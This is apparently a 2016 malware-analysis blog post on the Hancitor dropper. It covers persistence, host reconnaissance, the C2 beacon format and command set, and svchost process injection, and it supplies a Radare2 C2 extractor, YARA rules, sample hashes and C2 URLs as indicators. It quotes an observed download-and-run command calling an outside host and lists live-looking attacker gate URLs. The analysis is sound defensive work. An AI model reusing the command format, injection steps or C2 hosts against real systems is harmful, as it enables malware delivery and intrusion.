---
layout: category-post
title: "A Closer Look at Hancitor"
date: 2016-08-23T00:00:00-05:00
---

### Introduction

Hancitor is a popular dropper used in phishing campaigns.  It’s often associated with dropping vawtrak and pony.

There are already write-ups on Hancitor’s general capabilities, but we wanted to add some additional analysis and signatures to aid in detection/classification.

The execuable that we’ll be focusing on in this blogpost is SHA256 `587a530cc82ff01d6b2d387d9b558299b0eb36e7e2c274cd887caa39fcc47c6f`.

### Initial Setup

On initial setup, the malware will perform a check to see if it needs to be installed or not.  If the malware is not installed, it will copy itself to `C:\Windows\System32\WinHost32.exe` and set an autorun key at `\Microsoft\Windows\CurrentVersion\Run\WinHost32`.

<figure>
<img src="/images/hancitor01.jpg">
</figure>

Once copied, the malware will start the installed version.

### Connectivity Check

The malware will run in an infinite loop that will continually check to see if it can communicate to google.com 

<figure>
<img src="/images/hancitor02.jpg">
</figure>

It will check the first couple bytes of the buffer to ensure that they match `<!do`.  When looking at the source for google.com in a browser, it would appear that the malware is just ensuring that it can view the first couple bytes of the page.

<figure>
<img src="/images/hancitor03.jpg">
</figure>

The code for the check is several jump statements that pull bytes out of the buffer and place them into individual registers then check against the hard-coded characters.

<figure>
<img src="/images/hancitor04.jpg">
</figure>

If the connectivity check succeeds, the malware will then attempt to communicate with the C2 servers.  If the C2 attempt fails, it will sleep for 60 seconds and then try to connect to Google again.  This will go on indefinitely until a connection is established.

### Host Recon

On the malware’s initial connection to the C2 server it will perform some basic host reconnaissance.

The first thing it gathers is the Version, by an API call to GetVersion.

<figure>
<img src="/images/hancitor05.jpg">
</figure>

The information around the physical address and adapter is used to generate a GUID.

<figure>
<img src="/images/hancitor06.jpg">
</figure>

It will then gather the computer hostname and concat that string with “@” and the user that the explorer.exe process is running under.

<figure>
<img src="/images/hancitor07.jpg">
</figure>

The external IP address is pulled by calling out `http://api.ipify.org`

<figure>
<img src="/images/hancitor08.jpg">
</figure>

Finally it will grab the Windows version and architecture.

<figure>
<img src="/images/hancitor09.jpg">
</figure>

Once all this information is gathered, it’s combined into a format string:

```
GUID=%I64u&BUILD=%s&INFO=%s&IP=%s&TYPE=1&WIN=%d.%d(%s)
```

Once all host recon is finished, the malware will then parse the C2’s out of a hardcoded list.  The list is delimited by `|`.

<figure>
<img src="/images/hancitor10.jpg">
</figure>

The code to split the list based upon the delimiter can be seen below:

<figure>
<img src="/images/hancitor11.jpg">
</figure>

At this point, the malware will communicate out to the internet using the WinInet API (HttpOpenRequestA/InternetConnectA/InternetOpenA, etc…) 

An example of this on the wire looks like the following:
```
GUID=6692179317992390880&BUILD=&INFO=REDACTED @ REDACTED\user1&IP=xx.xx.xxx.xxx&TYPE=1&WIN=6.1(x32)
```

### Command Parsing

Once this information is sent out, the response is parsed to check for a valid instruction.

The main commands of Hancitor are:

|Command|Description|
|------|------|
|{r:URL}|Download and run an executable from URL specified|
|{l:URL}|Virtualalloc section, download and store executable and start thread in allocated section|
|{b:URL}|Download and inject code into \System32\svchost.exe (hardcoded)|
|{d:} |Delete self|
|{n:}|No Operation|

Even though the malware supports the above implemented commands, it looks for the following: r,u,d,l, and n.  Notice that “b” is not a valid command supported in the malware, but may be supported later.  If a “u” is provided, nothing will happen.  It appears that this is an unimplemented command that may have support in the future.

<figure>
<img src="/images/hancitor12.jpg">
</figure>

Commands can be issued at any time, but the malware sleeps for 30 seconds, then checks for a command, sleeps 30 seconds again, checks for a command, then sleeps 60 seconds before starting all over again.

### Download and Exec

If a command matching the following format

```
{r:http://trimsalonmarleen.nl/templates/system/inst2.exe}
```
is received, the malware will store the downloaded file in a temporary location (which is performed with GetTempPathA and GetTempFileNameA). 

<figure>
<img src="/images/hancitor13.jpg">
</figure>

The file is then downloaded and validated to make sure the first 2 bytes are 0x4d & 0x5a, (MZ header) ensuring it’s an executable file.

<figure>
<img src="/images/hancitor14.jpg">
</figure>

The file is then written to disk 

<figure>
<img src="/images/hancitor15.jpg">
</figure>

### Process Injection

If the `b` argument is provided, Hancitor will use process injection to run a downloaded binary inside a svchost process that it creates. It downloads the binary (using the same method as in the download and execute function) and does the same check for 0x4d5a.

Rather than writing the file to disk, the malware will create an svchost.exe process via CreateProcessA (after obtaining the full path to the exe).  The process is created in suspended mode using the mask of 0x424 in the dwCreationFlags.

<figure>
<img src="/images/hancitor16.jpg">
</figure>

Memory is allocated in the idle svchost.exe using VirtualAllocEx and the binary is copied into that memory using WriteProcessMemory. Next, the instruction pointer (EIP) is set using GetThreadContext and SetThreadContext. Finally, ResumeThread is used to start the injected process.

<figure>
<img src="/images/hancitor17.jpg">
</figure>

### Alloc and Run

If the `l` (lower-case ‘L’) option is provided, the malware will allocate a section in memory and execute the code that is downloaded from a URL.  In the wild, this command is often observed with a second command that will download and run a second binary.  This is demonstrated below.

<figure>
<img src="/images/hancitor18.jpg">
</figure>

### Delete
If the `d` option is provided, the malware will find its filename and issue a command to cmd.exe to delete itself.

<figure>
<img src="/images/hancitor19.jpg">
</figure>

### Modifying the Functionality

The command structure of the C2 made it easy to quickly build our own server side version of this malware that would give it custom commands to test the functionality.  We found that the “b” command didn’t work in its native implementation, as it’s currently disabled in the options.  However with some simple modifications we were able to get it working properly and using the “b” command, launch a process of our choosing under svchost.exe.  It would appear that this is a feature being developed for a future release.


### Building a Configuration Parser

Hancitor does not store its information in a configuration blob, rather each piece of information is referenced individually in code.  Building a traditional configuration parser can be made slightly more difficult when this method is used.  Using Radare2, we quickly built the following parser which would extract C2 information.

{% highlight python %}
{% raw %}
#!/usr/bin/env python
#Author: Nick Hoffman & Jeremy Humble
#Script to quickly extract C2 information from Hancitor samples
import r2pipe
import sys
import json
r2p = r2pipe.open(sys.argv[1])
r2p.cmd('aaa;aac;aap')
funcs = {}
for func in r2p.cmdj('aflj'):
    try:
        instructions = r2p.cmd("pdfj @ %s" % func['offset'])
        json_instructions = json.loads(instructions)
        for ops in json_instructions['ops']:
            if ops['type'] == "mov" and ops['size'] > 7:
                addr = int(str(ops['opcode']).split(", ")[-1],16)
                if addr > 0:
                    c2 = r2p.cmd("psz @ %s" % addr)
                    if "http" in c2:
                        elem_list = str(c2).split("|")
                        for i in range(len(elem_list)):
                            print("C2 Address %i: %s" % (i+1, elem_list[i]))
                        break # Found C2
        else:
            continue # Still looking for C2
        break # Found...get out...
    except:
        Pass
{% endraw %}
{% endhighlight %}

Running this code against a sample will yield the following information:
```
python hancitor_parse.py hancitor.exe

C2 Address 1: http://noruromin.com/ls3/gate.php
C2 Address 2: http://ughlittrinthe.ru/ls3/gate.php
C2 Address 3: http://roprinromrow.ru/ls3/gate.php
```

### Conclusions
Hancitor is slowly becoming a more robust downloader and will eventually support process injection among other techniques for code execution.  It’s important for defenders everywhere to stay on top of these techniques and be on the lookout.

While the malware doesn’t have many capabilities to evade detection (outside of using a packer to evade static signatures) it has proven to be successful in phishing campaigns.

### Yara
The following yara signatures can be used to track and find unpacked samples of Hancitor.

```
rule Dropper_Hancitor {
  meta:
    authors = "Nick Hoffman & Jeremy Humble - Morphick Inc."
    last_update = "2016-08-19"
    description = "rule to find unpacked Hancitor, useful against memory dumps"
    hash = "587a530cc82ff01d6b2d387d9b558299b0eb36e7e2c274cd887caa39fcc47c6f"

  strings:
    /*
    .text:00401C02 83 FA 3A                                      cmp     edx, ':'
    .text:00401C05 75 6B                                         jnz     short loc_401C72
    .text:00401C07 B8 01 00 00 00                                mov     eax, 1
    .text:00401C0C 6B C8 00                                      imul    ecx, eax, 0
    .text:00401C0F 8B 55 08                                      mov     edx, [ebp+arg_0]
    .text:00401C12 0F BE 04 0A                                   movsx   eax, byte ptr [edx+ecx]
    .text:00401C16 83 F8 72                                      cmp     eax, 'r'
    .text:00401C19 74 50                                         jz      short loc_401C6B
    .text:00401C1B B9 01 00 00 00                                mov     ecx, 1
    .text:00401C20 6B D1 00                                      imul    edx, ecx, 0
    .text:00401C23 8B 45 08                                      mov     eax, [ebp+arg_0]
    .text:00401C26 0F BE 0C 10                                   movsx   ecx, byte ptr [eax+edx]
    .text:00401C2A 83 F9 75                                      cmp     ecx, 'u'
    .text:00401C2D 74 3C                                         jz      short loc_401C6B
    .text:00401C2F BA 01 00 00 00                                mov     edx, 1
    .text:00401C34 6B C2 00                                      imul    eax, edx, 0
    .text:00401C37 8B 4D 08                                      mov     ecx, [ebp+arg_0]
    .text:00401C3A 0F BE 14 01                                   movsx   edx, byte ptr [ecx+eax]
    .text:00401C3E 83 FA 64                                      cmp     edx, 'd'
    .text:00401C41 74 28                                         jz      short loc_401C6B
    .text:00401C43 B8 01 00 00 00                                mov     eax, 1
    .text:00401C48 6B C8 00                                      imul    ecx, eax, 0
    .text:00401C4B 8B 55 08                                      mov     edx, [ebp+arg_0]
    .text:00401C4E 0F BE 04 0A                                   movsx   eax, byte ptr [edx+ecx]
    .text:00401C52 83 F8 6C                                      cmp     eax, 'l'
    .text:00401C55 74 14                                         jz      short loc_401C6B
    .text:00401C57 B9 01 00 00 00                                mov     ecx, 1
    .text:00401C5C 6B D1 00                                      imul    edx, ecx, 0
    .text:00401C5F 8B 45 08                                      mov     eax, [ebp+arg_0]
    .text:00401C62 0F BE 0C 10                                   movsx   ecx, byte ptr [eax+edx]
    .text:00401C66 83 F9 6E                                      cmp     ecx, 'n'
    */

    $arg_parsing = { 83 f? ( 3a | 6c | 64 | 75 | 74 ) 7? ?? b? 01 00 00 00 6b ?? 00 8b ?? 08 0f be 0? ?? }

    /*   

    .text:00401116 B8 01 00 00 00                                mov     eax, 1
    .text:0040111B 85 C0                                         test    eax, eax
    .text:0040111D 74 49                                         jz      short loc_401168
    .text:0040111F 8B 0D 88 5B 40 00                             mov     ecx, dword_405B88
    .text:00401125 0F BE 11                                      movsx   edx, byte ptr [ecx]
    .text:00401128 83 FA 7C                                      cmp     edx, '|'
    .text:0040112B 74 0C                                         jz      short loc_401139
    .text:0040112D A1 88 5B 40 00                                mov     eax, dword_405B88
    .text:00401132 0F BE 08                                      movsx   ecx, byte ptr [eax]
    .text:00401135 85 C9                                         test    ecx, ecx
    .text:00401137 75 08                                         jnz     short loc_401141

    */

    $pipe_delimit = { b8 01 00 00 00 85 c0 7? ?? 8b 0d ?? ?? ?? ?? 0f be 11 83 fa 7c 7? }

    $fmt_string = "GUID=%I64u&BUILD=%s&INFO=%s&IP=%s&TYPE=1&WIN=%d.%d(%s)"

    /*

    .text:00401AEE 83 FA 3C                                      cmp     edx, '<'
    .text:00401AF1 75 48                                         jnz     short loc_401B3B
    .text:00401AF3 B8 01 00 00 00                                mov     eax, 1
    .text:00401AF8 C1 E0 00                                      shl     eax, 0
    .text:00401AFB 0F BE 8C 05 FC FD FF FF                       movsx   ecx, [ebp+eax+Buffer]
    .text:00401B03 83 F9 21                                      cmp     ecx, '!'
    .text:00401B06 75 33                                         jnz     short loc_401B3B
    .text:00401B08 BA 01 00 00 00                                mov     edx, 1
    .text:00401B0D D1 E2                                         shl     edx, 1
    .text:00401B0F 0F BE 84 15 FC FD FF FF                       movsx   eax, [ebp+edx+Buffer]
    .text:00401B17 83 F8 64                                      cmp     eax, 'd'
    .text:00401B1A 75 1F                                         jnz     short loc_401B3B
    .text:00401B1C B9 01 00 00 00                                mov     ecx, 1
    .text:00401B21 6B D1 03                                      imul    edx, ecx, 3
    .text:00401B24 0F BE 84 15 FC FD FF FF                       movsx   eax, [ebp+edx+Buffer]
    .text:00401B2C 83 F8 6F                                      cmp     eax, 'o'

    */

    $connectivty_google_check = { 83 fa 3c 7? ?? b8 01 00 00 00 c1 e0 00 0f be 8c 05 fc fd ff ff 83 f9 21 7? ?? ba 01 00 00 00 d1 e2 0f be 84 15 fc fd ff ff 83 f8 64 7? ?? b9 01 00 00 00 6b d1 03 0f be 84 15 fc fd ff ff 83 f8 6f }

  condition:

    #arg_parsing > 1 or any of ($pipe_delimit, $fmt_string,$connectivty_google_check)

}
```

### Samples
```
0104dc712b57ab7c64f6ede0cf38361a55fe594d4ef40d035079f94a253a0f65
026e44cb2b4e166e2f8cca0e3acfcbbc175800d3c18d077d2b20ab14835ee733
34ae06ac1129da00a10b06ae1556aaea611cf51f21975467efe2d1c7e37f761c
5eab096c58b69ed3465bf9078eb7ee45f3cc6bb192b53aca47d5767fb3705de3
65e6800b2a1a5a0e5fa4f7940483718c0687f2d5e8e81ae4fa254f5921e38a2d
7e283c08ded61e0ecaaa51ea5294513cb4b5cb1c392de2f4086e32d082363d34
a031d320c524beaeaeed7e42260c6c72129021df6022acf2c767885f369e9403
a231dfa6f48da215ab12e4df58784939e23a967541795c0f9e57187c14c256d2
dfd5d7645d4e91fd65f8d139f4b3ee102027aad6f121608eb58135ed1d53355f
e4e19dba74029856f2d2239c36361a8d4d0819e41fafaeac0e0da03586736cc6
e99aa6d373f4bef6bcb7c41d2d64541de87d59e86f3652a6df442d66b11a719e
587a530cc82ff01d6b2d387d9b558299b0eb36e7e2c274cd887caa39fcc47c6f
```

### IOCs
```
http://andmabi.com/ls/gate.php
http://bettitotuld.com/ls3/gate.php
http://callereb.com/ls/gate.php
http://dafiutrat.ru/ls3/gate.php
http://evengritithan.com/sl/gate.php
http://eventtorshendint.ru/ls3/gate.php
http://fastnarrowgoes.com/sl/gate.php
http://fejusttold.ru/ls/gate.php
http://forwitmeand.com/sl/gate.php
http://growlifenews.com/sl/gate.php
http://helahatun.com/ls3/gate.php
http://hinhenharre.ru/ls3/gate.php
http://hinromfor.com/ls/gate.php
http://idmuchatbut.ru/ls3/gate.php
http://mopejusron.ru/sl/gate.php
http://onketorsco.com/ls3/gate.php
http://quarternetglow.com/sl/gate.php
http://redidfe.ru/ls/gate.php
http://romarbe.ru/ls/gate.php
https://krrewiaog3u4npcg.onion.to/sl/gate.php
http://supketwron.ru/ls/gate.php
http://tefaverrol.ru/ls3/gate.php
http://tonslacsotont.ru/ls3/gate.php
http://tughhenreton.ru/sl/gate.php
http://tysofati.ru/sl/gate.php
http://undwohed.ru/ls/gate.php
http://wassuseidund.ru/sl/gate.php
http://witjono.ru/ls/gate.php
```
